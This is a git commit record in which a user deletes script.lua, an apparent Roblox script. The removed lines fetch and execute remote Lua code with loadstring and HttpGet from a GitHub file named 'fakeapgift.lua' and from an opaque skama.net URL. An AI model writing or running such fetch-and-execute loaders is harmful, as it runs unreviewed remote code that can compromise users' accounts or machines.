64f827c868ad9768255fa291b45a2e61efac4780
itzrealelytra <itzrealelytra@gmail.com>
2026-03-26 19:02:18 +0530

    Delete script.lua

--- script.lua
+++
@@ -1,7 +0,0 @@
-task.spawn(function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/itzrealelytra/GalaxyHubScripts/main/fakeapgift.lua"))()
-end)
-
-task.spawn(function()
-   loadstring(game:HttpGet("https://skama.net/mrr_c21b3404dc044cf19fcddd53da4b338e/"))()
-end)
